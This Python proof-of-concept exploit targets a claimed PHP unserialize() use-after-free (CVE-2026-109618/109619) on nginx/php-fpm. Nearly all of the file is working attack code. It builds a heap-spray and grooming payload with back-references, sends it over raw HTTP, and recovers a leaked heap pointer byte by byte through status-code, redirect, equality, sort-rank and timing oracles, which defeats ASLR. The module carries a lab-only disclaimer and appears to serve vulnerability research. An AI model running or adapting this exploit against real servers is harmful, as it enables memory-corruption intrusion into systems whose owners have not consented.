#!/usr/bin/env python3
# INDEX: non-echo side-effect exfil of injected pointer | fpm | needs attacker-influenced operand
"""Read back an injected pointer/value through a NON-echo observable side effect
(status / redirect / timing / sort-rank / equality).

A var_hash UAF (CVE-2026-109618 / 109619) writes a live pointer (or
attacker-forged zend_string bytes) into a field of the unserialized result.
Instead of reading it back via `echo serialize($result)`, this module exfils it
from any OBSERVABLE SIDE EFFECT of the unserialize() result -- the HTTP status
code, a redirect Location, a differential branch, a sort/ORDER-BY order, or a
measurable delay. Because PHP compares strings byte-lexicographically (strcmp,
usort, `<`, ORDER BY), an ORDERED side effect that branches on `field <=> guess`
lets a binary search over `guess` recover each byte of the leaked field in ~8
requests, with no echo. echo is used only as the verifier's ground truth.

Bits/request per side-effect class:
  ordered -> HTTP status (302/200) : 1 bit/req  -> ~8 req/byte   (binary search)
  ordered -> redirect Location     : 1 bit/req  -> ~8 req/byte
  ordered -> timing (usleep)       : ~1 bit/req on a quiet LAN; collapses once
                                      the usable delay approaches network jitter
  sort / ORDER BY rank (n anchors) : log2(n+1) bits/req (highest bandwidth)
  equality branch (===)            : CONFIRM only (<=256 req/byte brute); cannot
                                      binary-search a high-entropy value

SCOPE / PRECONDITIONS:
* The leaked pointer's low ~12 in-page-offset bits depend on the exact request
  SHAPE (field count/sizes), which shifts the ZendMM reclaim slot; the high
  (ASLR-bearing) bits are stable. Every request is sent with an identical field
  shape, and a mode recovers the pointer AS SEEN IN THAT shape; the high bytes
  (what ASLR hides) match across shapes.
* The bit-oracle needs the compared operand to be ATTACKER-INFLUENCED (a request
  param the app compares the field against, or a sort/order including the field).
  An app comparing the field only against a fixed server constant gives a single
  equality bit, not a binary search.
* PHP's `<`/`<=`/sort on two NUMERIC strings does a NUMERIC compare; a pointer
  read (embedded NULs / high bytes) is non-numeric so byte compare applies, but a
  field that can look all-digit needs an strcmp-style sink (usort/strcmp/collated
  ORDER BY).
* The field OFFSET of the leaked pointer inside the sprayed value is a property
  of the groom (bucket index); taken as --voff, no echo needed to exfil.

Tested: nginx -> php-fpm 8.4.26, single worker (oracle.php).

Pure stdlib; safe under `python3 -I`; its one project import is the shared
raw-HTTP transport helper.

Lab/analysis use only, on systems you own.
"""
from __future__ import annotations

import argparse
import math
import os
import re
import socket
import struct
import sys
import time
import urllib.parse

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from common.http_raw import dechunk as _dechunk_body  # noqa: E402

# --- spray/groom constants (inlined so this module is standalone) -------------
SPRAY_LEN = 280
SPRAY_COUNT = 32
NUM_PROPS = 8
REF_BASE = 4
MAX_REFS = 8
GUESS_PAD = 64          # fixed guess length -> constant request shape
DEFAULT_KEY = 1         # array key the engine leaks the pointer into
DEFAULT_VOFF = 40       # byte offset of the leaked pointer inside the value
PTR_LOW_BYTES = 6       # a 48-bit canonical userspace pointer

# The var_hash UAF gadget payload. C:"CachedData" invokes the Serializable
# unserialize() that recursively decodes and does the 9th-insert arData efree.
_INNER = ''.join(
    f's:{len("p%d" % k)}:"p{k}";i:{0xAAAA0000 + k};' for k in range(NUM_PROPS))
_C_PART = f'C:10:"CachedData":{len(f"O:8:\"stdClass\":{NUM_PROPS}:{{{_INNER}}}")}:' \
          f'{{O:8:"stdClass":{NUM_PROPS}:{{{_INNER}}}}}'


def build_spray():
    """The 280-byte sprayed value with bucket markers; the engine overwrites one
    bucket's 8-byte slot with the live zend_reference* (ZVAL_MAKE_REF)."""
    spray = bytearray(SPRAY_LEN)
    for k in range(8):
        vo = 8 + k * 32
        struct.pack_into('<I', spray, vo, 0xBBBB0000 + k)
        struct.pack_into('<I', spray, vo + 8, 0x04)
    return bytes(spray)


def build_payload(spray):
    """a:N:{ gadget; 32 sprayed strings; MAX_REFS back-references }.
    The R: back-references make ZVAL_MAKE_REF stamp a heap pointer over a
    reclaimed sprayed slot -> the bootstrap leak."""
    total = 1 + SPRAY_COUNT + MAX_REFS
    parts = [f'i:0;{_C_PART}'.encode('latin-1')]
    for i in range(SPRAY_COUNT):
        parts.append(f'i:{i + 1};s:{SPRAY_LEN}:"'.encode('latin-1') + spray + b'";')
    for k in range(MAX_REFS):
        parts.append(f'i:{SPRAY_COUNT + 1 + k};R:{REF_BASE + k};'.encode('latin-1'))
    return b'a:' + str(total).encode() + b':{' + b''.join(parts) + b'}'


# --- transport: constant-shape urlencoded POST --------------------------------
MODE_CODE = {'echo': b'0', 'cmp': b'1', 'redir': b'2',
             'eq': b'3', 'sort': b'4', 'timing': b'5'}


class Target:
    def __init__(self, host, port, path='/oracle.php', timeout=8.0):
        self.host, self.port, self.path, self.timeout = host, port, path, timeout
        self.reqs = 0

    def post(self, fields):
        """fields: list of (bytes, bytes). Returns (status, headers, body, dt)."""
        self.reqs += 1
        body = b'&'.join(urllib.parse.quote_from_bytes(k).encode() + b'=' +
                         urllib.parse.quote_from_bytes(v).encode() for k, v in fields)
        req = (f'POST {self.path} HTTP/1.1\r\nHost: {self.host}\r\n'
               f'Content-Type: application/x-www-form-urlencoded\r\n'
               f'Content-Length: {len(body)}\r\nConnection: close\r\n\r\n'
               ).encode() + body
        t0 = time.time()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(self.timeout)
        resp = b''
        try:
            s.connect((self.host, self.port))
            s.sendall(req)
            while True:
                c = s.recv(65536)
                if not c:
                    break
                resp += c
        except OSError:
            pass
        finally:
            s.close()
        dt = time.time() - t0
        head, _, raw = resp.partition(b'\r\n\r\n')
        m = re.match(rb'HTTP/1\.[01] (\d{3})', head)
        status = int(m.group(1)) if m else 0
        return status, head, _dechunk(head, raw), dt

    def fields(self, mode, key, g=b'', n=0, delay_us=0, anchors=b'', pad=True):
        gg = bytearray(GUESS_PAD) if pad else bytearray(len(g))
        gg[:len(g)] = g
        return [(b'cook', self.payload), (b'k', str(key).encode()),
                (b'g', bytes(gg)), (b'mode', MODE_CODE.get(mode, mode)),
                (b'n', str(n).zfill(3).encode()),
                (b'delay_us', str(delay_us).zfill(7).encode()),
                (b'anchors', anchors)]


def _dechunk(head, raw):
    if b'chunked' not in head.lower():
        return raw
    return _dechunk_body(raw)


def warmup(t, key, rounds=3):
    """The first request after (re)start reclaims a cold slot; a few warmup
    fires bring the single worker's heap to the steady slot the oracle reads."""
    for _ in range(rounds):
        t.post(t.fields('cmp', key, g=b'\x00'))


# --- echo channel (verifier ground truth ONLY; never used to exfil) -----------
def echo_leak(t, key, voff, nbytes=PTR_LOW_BYTES):
    """Read the TRUE leaked bytes via mode=echo (serialize reflection). The
    verifier uses this to check the non-echo recoveries; it is the very channel
    the exercise avoids. Returns the nbytes little-endian pointer bytes or None."""
    _, _, body, _ = t.post(t.fields('echo', key))
    idx = body.find(b'a:')
    if idx < 0:
        return None
    m = re.search(b'i:' + str(key).encode() + b';s:%d:"' % SPRAY_LEN, body[idx:])
    if not m:
        return None
    d = idx + m.start() + len(m.group(0))
    val = body[d:d + SPRAY_LEN]
    if len(val) < voff + nbytes:
        return None
    return val[voff:voff + nbytes]


# --- ordered oracle -> binary search each byte (status or redirect) -----------
def _ordered_hit(t, mode, key, guess):
    """One ordered probe. HIT (field < guess) iff mode's observable fires."""
    st, head, _, _ = t.post(t.fields(mode, key, g=guess))
    if mode == 'cmp':
        return st == 302
    if mode == 'redir':
        return b'Location: /hit' in head
    raise ValueError(mode)


def exfil_ordered(t, mode, key, voff, known_prefix, nbytes=PTR_LOW_BYTES, log=None):
    """Binary-search the leaked field byte-by-byte over an ORDERED side effect.
    `known_prefix` is the groom's known sprayed bytes up to `voff`. Returns the
    recovered little-endian pointer bytes (length nbytes)."""
    known = bytearray(known_prefix[:voff])
    for pos in range(voff, voff + nbytes):
        lo, hi = 0, 256
        while lo < hi:
            mid = (lo + hi) // 2
            if _ordered_hit(t, mode, key, bytes(known) + bytes([mid])):
                hi = mid            # field < guess => field[pos] < mid
            else:
                lo = mid + 1
        known.append(lo - 1)
        if log:
            log(f"  {mode}: byte[{pos}] = 0x{lo - 1:02x}")
    return bytes(known[voff:voff + nbytes])


# --- equality oracle -> brute each byte (confirm-only) ------------------------
def eq_confirm(t, key, voff, known_prefix, recovered):
    """Non-echo cross-check: ask the EQUALITY oracle whether the field's first
    voff+len(recovered) bytes equal (groom prefix || recovered). A 200 confirms
    the ordered-oracle recovery WITHOUT any echo (a second, independent
    side-effect channel agreeing with the first)."""
    g = known_prefix[:voff] + recovered
    st, _, _, _ = t.post(t.fields('eq', key, g=g, n=voff + len(recovered), pad=True))
    return st == 200


def exfil_equality(t, key, voff, known_prefix, nbytes=PTR_LOW_BYTES, log=None):
    """Recover via an EQUALITY (===) branch only. Brute each byte 0..255 and
    stop at the first prefix the app confirms equal (<=256 req/byte). Shows how
    much weaker an equality sink is than an ordered one."""
    known = bytearray(known_prefix[:voff])
    for pos in range(voff, voff + nbytes):
        found = None
        for cand in range(256):
            g = bytes(known) + bytes([cand])
            st, _, _, _ = t.post(t.fields('eq', key, g=g, n=pos + 1, pad=True))
            if st == 200:
                found = cand
                break
        if found is None:
            raise RuntimeError(f"equality oracle: no byte matched at {pos}")
        known.append(found)
        if log:
            log(f"  eq: byte[{pos}] = 0x{found:02x}")
    return bytes(known[voff:voff + nbytes])


# --- sort / ORDER-BY rank oracle -> log2(n+1) bits/request --------------------
def sort_rank(t, key, voff, known_prefix, anchor_bytes, log=None):
    """One request: insert `anchor_bytes` (values sharing the groom prefix but
    differing at byte voff) alongside the leaked field and read the LABEL
    permutation. The probe's position reveals the byte-voff interval -> up to
    log2(len(anchor_bytes)+1) bits from a single request."""
    anchors = b'\n'.join(known_prefix[:voff] + bytes([b]) for b in anchor_bytes)
    _, _, body, _ = t.post(t.fields('sort', key, anchors=anchors))
    perm = body.decode('latin-1', 'replace').split()
    rank = perm.index('P') if 'P' in perm else -1
    if log:
        log(f"  sort permutation: {' '.join(perm)}  (probe rank={rank})")
    return rank, perm


# --- timing oracle characterization -------------------------------------------
def timing_delta(t, key, voff, known_prefix, delay_us, samples=9):
    """Median wall-clock of HIT (sleep) vs MISS branches for a given delay."""
    def med(guess):
        ds = sorted(t.post(t.fields('timing', key, g=guess, delay_us=delay_us))[3]
                    for _ in range(samples))
        return ds[len(ds) // 2]
    miss = med(known_prefix[:voff] + b'\x00')      # field >= guess: no sleep
    hit = med(known_prefix[:voff] + b'\xff')       # field <  guess: sleep
    return miss, hit, hit - miss


# --- driver -------------------------------------------------------------------
def run(host, port, path='/oracle.php', key=DEFAULT_KEY, voff=DEFAULT_VOFF,
        nbytes=PTR_LOW_BYTES, modes=('cmp', 'redir', 'eq', 'sort', 'timing'),
        verify_echo=True, log=print):
    t = Target(host, port, path)
    spray = build_spray()
    t.payload = build_payload(spray)
    known_prefix = spray                # known groom bytes (prefix up to voff)

    warmup(t, key)
    truth = echo_leak(t, key, voff, nbytes) if verify_echo else None
    if truth is not None:
        P = struct.unpack('<Q', truth + b'\x00' * (8 - len(truth)))[0]
        log(f"[echo ground truth] leaked pointer low{nbytes * 8}b = "
            f"0x{truth.hex()}  (P=0x{P:x})")

    results = {}
    if 'cmp' in modes:
        r0 = t.reqs
        rec = exfil_ordered(t, 'cmp', key, voff, known_prefix, nbytes, log)
        results['status'] = {'bytes': rec, 'reqs': t.reqs - r0,
                             'match': (truth is None or rec == truth)}
        log(f"[status oracle] recovered 0x{rec.hex()}  "
            f"match={results['status']['match']}  "
            f"{(t.reqs - r0) / nbytes:.1f} req/byte")
    if 'redir' in modes:
        r0 = t.reqs
        rec = exfil_ordered(t, 'redir', key, voff, known_prefix, nbytes, log)
        results['redirect'] = {'bytes': rec, 'reqs': t.reqs - r0,
                               'match': (truth is None or rec == truth)}
        log(f"[redirect oracle] recovered 0x{rec.hex()}  "
            f"match={results['redirect']['match']}  "
            f"{(t.reqs - r0) / nbytes:.1f} req/byte")
    if 'eq' in modes:
        r0 = t.reqs
        rec = exfil_equality(t, key, voff, known_prefix, 1, log)   # 1 byte: cost demo
        results['equality'] = {'bytes': rec, 'reqs': t.reqs - r0,
                               'match': (truth is None or rec == truth[:1])}
        log(f"[equality oracle] 1 byte 0x{rec.hex()} in {t.reqs - r0} reqs "
            f"(confirm-only, <=256/byte)  match={results['equality']['match']}")
    if 'sort' in modes:
        anchors = list(range(0x10, 0x100, 0x20))     # 8 anchors
        rank, perm = sort_rank(t, key, voff, known_prefix, anchors, log)
        results['sort'] = {'anchors': len(anchors), 'rank': rank,
                           'bits_per_req': math.log2(len(anchors) + 1)}
        log(f"[sort oracle] 1 request -> rank {rank} of {len(anchors) + 1} "
            f"=> {math.log2(len(anchors) + 1):.1f} bits/request")
    if 'timing' in modes:
        log("[timing oracle] HIT-vs-MISS median latency by delay:")
        tdata = []
        for d in (2000, 10000, 50000):
            miss, hit, delta = timing_delta(t, key, voff, known_prefix, d, samples=7)
            tdata.append((d, miss, hit, delta))
            log(f"    delay={d:6}us  miss={miss * 1000:.1f}ms  "
                f"hit={hit * 1000:.1f}ms  delta={delta * 1000:.1f}ms")
        results['timing'] = tdata
    log(f"[total] {t.reqs} requests")
    return results


def main(argv=None):
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument('--host', default='127.0.0.1')
    ap.add_argument('--port', type=int, default=8146)
    ap.add_argument('--path', default='/oracle.php')
    ap.add_argument('--key', type=int, default=DEFAULT_KEY)
    ap.add_argument('--voff', type=int, default=DEFAULT_VOFF)
    ap.add_argument('--nbytes', type=int, default=PTR_LOW_BYTES)
    ap.add_argument('--no-echo-verify', action='store_true',
                    help='skip the echo ground-truth read (pure non-echo exfil)')
    ap.add_argument('--modes', default='cmp,redir,eq,sort,timing')
    a = ap.parse_args(argv)
    res = run(a.host, a.port, a.path, a.key, a.voff, a.nbytes,
              modes=tuple(a.modes.split(',')), verify_echo=not a.no_echo_verify)
    ok = all(v.get('match', True) for v in res.values() if isinstance(v, dict))
    return 0 if ok else 1


if __name__ == '__main__':
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
